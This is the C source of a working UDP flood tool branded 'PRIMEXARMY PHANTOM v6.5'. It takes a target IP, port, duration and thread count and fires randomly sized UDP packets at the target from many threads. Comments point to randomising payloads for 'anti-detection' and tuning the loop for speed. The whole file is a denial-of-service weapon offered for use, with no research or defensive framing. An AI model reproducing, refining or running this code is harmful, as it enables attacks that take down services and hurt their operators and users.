#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <netinet/ip.h>

/* ⚔️ PRIMEXARMY v6.5 - PHANTOM UDP (Optimized) ⚔️ */

struct thread_data {
    char ip[16];
    int port;
    int duration;
};

void *prime_strike(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) return NULL;

    // ✨ NON-BLOCKING & TOS (Type of Service) for Priority
    fcntl(sock, F_SETFL, O_NONBLOCK);
    int tos = 0x10; 
    setsockopt(sock, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    char payload[1024];
    time_t end_time = time(NULL) + data->duration;
    unsigned long int packet_count = 0;

    while (1) {
        // Optimization: Time check every 5000 packets for raw speed
        if (packet_count % 5000 == 0) {
            if (time(NULL) >= end_time) break;
        }

        // Randomizing payload every few packets for anti-detection
        if (packet_count % 10 == 0) {
            for (int i = 0; i < 64; i++) {
                payload[i] = (char)(rand() % 256);
            }
        }

        int packet_size = 128 + (rand() % 896); // 128 to 1024 bytes
        
        sendto(sock, payload, packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        packet_count++;
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("\n   ⚔️  𝗣𝗥𝗜𝗠𝗘𝗫𝗔𝗥𝗠𝗬 𝗣𝗛𝗔𝗡𝗧𝗢𝗠 𝘃𝟲.𝟱  ⚔️\n");
        printf("   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
        printf("   Usage: ./PRIME <ip> <port> <time> <threads>\n\n");
        return 1;
    }

    struct thread_data data;
    strncpy(data.ip, argv[1], 15);
    data.port = atoi(argv[2]);
    data.duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t thread_id[threads];
    srand(time(NULL));

    printf("🚀 [PHANTOM v6.5] Strike on %s:%d | Threads: %d\n", data.ip, data.port, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_id[i], NULL, prime_strike, (void *)&data) != 0) {
            continue; 
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_id[i], NULL);
    }

    printf("✅ [FINISHED] Operation Complete.\n");
    return 0;
}
